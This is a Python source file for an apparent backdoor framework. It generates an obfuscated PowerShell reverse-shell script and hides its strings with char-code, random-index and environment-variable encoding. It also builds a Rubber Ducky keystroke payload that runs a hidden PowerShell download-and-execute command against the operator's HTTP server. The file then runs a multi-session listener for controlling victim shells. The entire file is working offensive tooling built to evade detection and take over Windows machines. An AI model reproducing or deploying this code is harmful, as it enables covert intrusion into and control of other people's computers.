from core.utils import *

class Settings:
    backdoor_server_address = ('0.0.0.0', 443)
    http_server_address = ('0.0.0.0', 8080)
    script_name = 'backdoor.ps1'
    def print_menu(self):
        return f"""
    {n} Backdoor Server   ::  {self.backdoor_server_address[0]}:{self.backdoor_server_address[1]}
    {n} HTTP Server       ::  {self.http_server_address[0]}:{self.http_server_address[1]}
    {n} Script Name       ::  {self.script_name}
    """
    def help_menu(self):
        return f"""
    {n} help         :: Displays Commands and Options         :: 
    {n} set      {gray("[+]")} :: Change options to jobs                :: {gray(f"set backdoor {white('<ip> <port>')}")}, {gray(f"set http {white('<ip> <port>')}")}
    {n} options      :: Shows Set Options                     :: 
    {n} start    {gray("[+]")} :: Starts Server                         :: {gray("http, backdoor")}
    {n} generate {gray("[+]")} :: Generates .ps1 or .bin                :: {gray("script, bin")}
    {n} kill     {gray("[+]")} :: Kills Server                          :: {gray("http, backdoor")}
    {n} sessions     :: Displays All Backdoor Sessions        ::
    {n} end      {gray("[+]")} :: Ends a Specified Session              :: {gray(f"end session {white('<session>')}")}
    {n} exit         :: Exits                                 :: 
    """
class Generator:
    def __init__(self, settings=Settings):
        self.settings = settings
        
    def list_2_character_2_string(self, passed_object):
        command = passed_object if isinstance(passed_object, str) else passed_object.group(0)[1:-1]
        return r"([string]::join('', ( (" + ','.join(str(ord(character)) for character in command) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"
	
    def character_2_string(self, passed_object):
        command = passed_object if isinstance(passed_object, str) else passed_object.group(0)[1:-1]
	    
        parts = []
	
        for character in command:
            rnd = random.randint(1, 99)
            operation = "+" if random.choice([True, False]) else "*"
            compliment = "-" if operation == "+" else "/"
            if operation == "+":
                part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
            else:
                part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_})"
            parts.append(part)
	    
        return '+'.join(parts)

    def random_string_2_string(self, passed_object):
        command = passed_object if isinstance(passed_object, str) else passed_object.group(0)[1:-1]
	    
        char_positions = [''] * 170
        indices_used = []
    
        for character in command:
            index = random.choice([i for i in range(170) if char_positions[i] == ''])
            char_positions[index] = character
            indices_used.append(index)
        
        for i in range(len(char_positions)):
            if char_positions[i] == '':
                char_positions[i] = random.choice(string.ascii_letters + string.digits)
		
        return "('" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_})"
                    
    def environment_variables_2_string(self, passed_object):
        env = ["ALLUSERSPROFILE",
	            "CommonProgramFiles",
	            "ComSpec",
	            "ProgramData",
	            "ProgramFiles",
	            "ProgramW6432",
	            "PSModulePath",
	            "PUBLIC",
	            "SystemDrive",
	            "SystemRoot",
	            "windir"]

        environment_variable_character_map = {}

        for character in string.printable:
            environment_variable_character_map[character] = {}
            for variable in env:
                value = os.getenv(variable)
                if character in value:
                    environment_variable_character_map[character][variable] = []
                    for index, character_in_value in enumerate(value):
                        if character == character_in_value:
                            environment_variable_character_map[character][variable].append(index)

        command = passed_object if isinstance(passed_object, str) else passed_object.group(0)[1:-1]
	    
        hidden_strings = []
        for character in command:
            if character in environment_variable_character_map and environment_variable_character_map[character]:
                possible_variables = list(environment_variable_character_map[character].keys())
                chosen_variable = random.choice(possible_variables)
                possible_index = environment_variable_character_map[character][chosen_variable]
                chosen_index = random.choice(possible_index)
                hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
            else:
                hidden_strings.append(random.choice([self.list_2_character_2_string,
                                                     self.character_2_string,
                                                     self.random_string_2_string])(character))
        return "+".join(hidden_strings)

    def script_to_char(self, s):
        return "([string]::join('',((" + ','.join(str(ord(c)) for c in s) + r")|%{[char]$_})))|invoke-expression"

    def generate_ps1(self):
        with open("core/payload/ps1/template.txt", "r") as f:
            reverse_shell = f.read()
        
        pattern = r"\\.+?\\"
    
        print(f"{n} generating {self.settings.script_name} . . .")        

        variables_2_replace = [
            "ReverseShellConnection",
            "NetworkStream",
            "ReadBuffer",
            "BytesRead",
            "CommandOutput",
            "ExecutedOutput",
            "PromptWithOutput",
            "OutputBytes"
        ]

        for variable in variables_2_replace:
            random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
            reverse_shell = reverse_shell.replace(variable, random_string)

        reverse_shell = reverse_shell.replace("IP_ADDRESS", self.settings.backdoor_server_address[0])
        reverse_shell = reverse_shell.replace("PORT", str(self.settings.backdoor_server_address[1]))

        if os.name == 'nt':
            for match in range(int(reverse_shell.count("\\")/2)):
                reverse_shell = re.sub(pattern, lambda m: random.choice([self.list_2_character_2_string, self.character_2_string, self.random_string_2_string, self.environment_variables_2_string])(m), reverse_shell, count=1)

        else: 
            for match in range(int(reverse_shell.count("\\")/2)):
                reverse_shell = re.sub(pattern, lambda m: random.choice([self.list_2_character_2_string, self.character_2_string, self.random_string_2_string])(m), reverse_shell, count=1)
        
        with open(f'server/{self.settings.script_name}', 'w') as c:
            c.write(self.script_to_char(reverse_shell))
        print(f"{i} {self.settings.script_name} created")
    
        f.close()
        c.close()
    
    def encode_duckyscript(self):
        print(f"{n} encoding inject.bin . . .")
        ducky = f"""GUI r\nDELAY 500\nSTRING powershell -w h -c "iex(new-object system.net.webclient).downloadstring('http://{self.settings.http_server_address[0]}:{str(self.settings.http_server_address[1])}/{self.settings.script_name}')"\nENTER"""
        with open("core/payload/ducky/script.txt", "w") as f:
            f.write(ducky)
        f.close()
        command = ["java", "-jar", "./core/payload/ducky/encoder.jar", "-i", "./core/payload/ducky/script.txt", "-o", "inject.bin"]
        subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not os.path.exists('inject.bin'):
            print(f"{e} failed to create inject.bin")
            return
        print(f"{i} inject.bin created")
        os.remove("core/payload/ducky/script.txt")

class BackdoorClient:
    def __init__(self, client):
        self.client = client
        self.client_thread = None
        self.shutdown = False
        
    def format_data(self, data): 
        last_line = data.split("\n")[-1]
        formatted_last_line = f"{red(last_line.split()[0])} [{gray(last_line.split()[1][1:-3])}]~$ "
        return "\n".join(data.split("\n")[:-1] + [formatted_last_line])
        
    def recvall(self) -> bytes: 
        while not self.shutdown:
            try:
                data = ""
                while True:
                    part = self.client.recv(1024).decode()
                    data += part
                    if len(part) < 1024:
                        break
                if '@' in data.split('\n')[-1]:
                    data = self.format_data(data)
                print(data, end="", flush=True)
            except:
                print(f"{e} Connection Reset. Press Anything to continue . . . ")
                self.shutdown = True
                break

    def send_commands(self):
        while not self.shutdown:
            try:
                command = input() + "\n"
                self.client.send(command.encode())
            except KeyboardInterrupt:
                print(f"\n{n} Backgrounding Session")
                break
            except:
                break

    def start_client_communication(self):
        self.client_thread = threading.Thread(target=self.recvall)
        self.shutdown = False
        self.client_thread.daemon = True
        self.client_thread.start()
        self.send_commands()
        self.shutdown = False

class BackdoorServer:
    def __init__(self, settings=Settings):
        self.settings = settings
        self.server = None
        self.shutdown = threading.Event()
        self.clients = []
        
    def listen(self):
        try:
            self.server.bind(self.settings.backdoor_server_address)
            while True:
                self.server.listen(1)
                client, addr = self.server.accept()
                print(f"\n{n} Connection made to backdoor from {addr[0]}:{addr[1]}\n{prompt}", end="", flush=True)
                self.clients.append(client)
        except:
            return
    
    def server_startup(self):
        if self.server:
            self.server_shutdown()
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setblocking(False)
        self.server_thread = threading.Thread(target=self.listen)
        self.server_thread.daemon = True
        self.server_thread.start()
        print(f"{n} Multi Handling Listener {red(f'[{self.settings.backdoor_server_address[1]}]')}")
        
    def server_shutdown(self):
        print(f"{n} Stopping Backdoor Server")
        self.shutdown.set()
        self.server.close()
        for client in self.clients:
            client.close()
        self.server = None

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    if not os.path.exists("server"):
        os.makedirs("server")
    def __init__(self, *args, directory=os.path.join(os.getcwd(), "server"), **kwargs):
        super().__init__(*args, directory=directory, **kwargs)
    def log_request(self, code='-', size='-'):
        if code == 200:
            print(f"\n{n} Successful request for server{self.path} from {self.address_string()}\n{n} Stopping Server\n{prompt}", end="", flush=True)
    def log_message(self, format, *args):
        print(f"\n{n} Invalid HTTP request from {self.address_string()}\n{n} Stopping Server\n{prompt}", end="", flush=True)

class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, HandlerClass, bind_and_activate=True, settings=Settings):
        self.settings = settings
        self.http_thread = None
        self.shutdown = False
        super().__init__(self.settings.http_server_address, HandlerClass, bind_and_activate)
        
    def request(self):
        self.handle_request()
        self.server_close()
        
    def server_startup(self):
        self.http_thread = Thread(target=self.request)
        self.http_thread.daemon = True
        self.http_thread.start()
        print(f"{n} HTTP Serving 1 Request {red(f'[{self.settings.http_server_address[1]}]')}")
        
    def server_shutdown(self):
        print(f"{n} Stopping HTTP server")
        self.shutdown = True
        self.server_close()
      

class CommandHandler:
    def __init__(self, settings=Settings):
        self.settings = settings
        self.backdoor_server = None
        self.http_server = None
        self.commands = {
            'start backdoor':    self.start_backdoor_server,
            'kill backdoor':     self.kill_backdoor_server,
            'start http':        self.start_http_server,
            'kill http':         self.kill_http_server,
            'generate script':   self.generate_script,
            'generate bin':      self.generate_bin,
            'options':           self.show_options,
            'sessions':          self.show_sessions,
            'help':              self.show_help,
            'clear':             flush,
            'exit':              self.Vanguard_out
        }

    def Vanguard_out(self):
        print(f"{e} Exiting . . .")
        quit()
        
    def set_option(self, command):
        args = command.split()
        if len(args)<2:
            print(f"{e} '{command}' needs options")
            return
        if (args[1] != 'script' and len(args) != 4) or (args[1] == 'script' and len(args) != 3):
            print(f"{e} '{command}' needs the correct options")
            return
        backdoor_used = args[2] == str(self.settings.backdoor_server_address[1])
        http_used = args[2] == str(self.settings.http_server_address[1])
        option_used = backdoor_used or http_used
        if option_used:
            print(f"{e} Option is already being used")
            return
        if ((args[1] == 'backdoor') or (args[1] == 'http')) and ((not validate_ip(args[2])) or (not validate_port(args[3]))):
            print(f"{e} Please input a valid IP/Port combimation")
            return
        if args[1] == 'backdoor':
            self.settings.backdoor_server_address = (args[2], int(args[3]))
            print(f"backdoor address => {args[2]}:{args[3]}")
            return
        elif args[1] == 'http':
            self.settings.http_server_address = (args[2], int(args[3]))
            print(f"http address => {args[2]}:{args[3]}")
            return
        elif args[1] == 'script':
            self.settings.script_name = args[2]
            print(f"scrit name => {args[2]}")
        else:
            print(f"{e} '{command}' is not recognized as a command")
            return
    
    def start_backdoor_server(self):
        if self.backdoor_server:
            self.kill_backdoor_server()
        self.backdoor_server = BackdoorServer()
        self.backdoor_server.server_startup()

    def kill_backdoor_server(self):
        self.backdoor_server.server_shutdown()
        self.backdoor_server = None
        
    def start_http_server(self):
        if self.http_server:
            self.kill_http_server()
        self.http_server = HTTPServer(CustomHTTPHandler)
        self.http_server.server_startup()
    
    def kill_http_server(self):
        self.http_server.server_shutdown()
        self.http_server = None
        
    def generate_script(self):
        Generator().generate_ps1()
        
    def generate_bin(self):
        Generator().encode_duckyscript()
        
    def show_options(self):
        print(Settings().print_menu())
        
    def show_sessions(self):
        if (not self.backdoor_server) or (not self.backdoor_server.clients):
            print(f"{e} No Sessions Made")
            return
        print("\n".join([f"Session {red(f'[{self.backdoor_server.clients.index(client)+1}]')} {client.getpeername()[0]}:{client.getpeername()[1]}" for client in self.backdoor_server.clients]))
        
    def enter_session(self, client):
        backdoor_client = BackdoorClient(client)
        backdoor_client.start_client_communication()
        
    def kill_session(self, command):
        args = command.split()
        if len(args) != 3:
            print(f"{e} '{command}' is not recognized as a command")
            return
        session = int(args[2])
        if not self.backdoor_server:
            print(f"{e} No Sessions Made")
            return
        if (1>session) or (session>len(self.backdoor_server.clients)):
            print(f"{e} Session Doesnt Exist")
            return
        self.backdoor_server.clients[session-1].close()
        del self.backdoor_server.clients[session-1]
        time.sleep(1)
        print(f"Session {red(f'[{session}]')} Ended")
    
    def show_help(self):
        print(Settings().help_menu())

    def command(self, command):
        if (not command) or (set(command) in null_bar):
            return
        if (command.split()[0] != 'set') and (command.split()[0] != 'end') and (command.split()[0] != 'session') and (command not in self.commands):
            print(f"{e} '{command}' is not recognized as a command")
            return
        if command.split()[0] == 'set':
            self.set_option(command)
            return
        if command.split()[0] == 'end':
            self.kill_session(command)
            return
        if command.split()[0] == 'session':
            if len(command.split())<2:
                print(f"{e} '{command}' is not recognized as a command")
                return
            self.enter_session(self.backdoor_server.clients[int(command.split()[1])-1])
            return
        self.commands[command]()
        
    
def main():
    
    flush()
    
    print(logo)
    command_handler = CommandHandler()
    command_handler.start_backdoor_server()
    command_handler.start_http_server()

    print()

    while True:
        try:
            command_handler.command(input(prompt).lower())
        except KeyboardInterrupt:
            print(f"\n{e} Exiting . . .")
            break
    
if __name__ == "__main__":
    main()
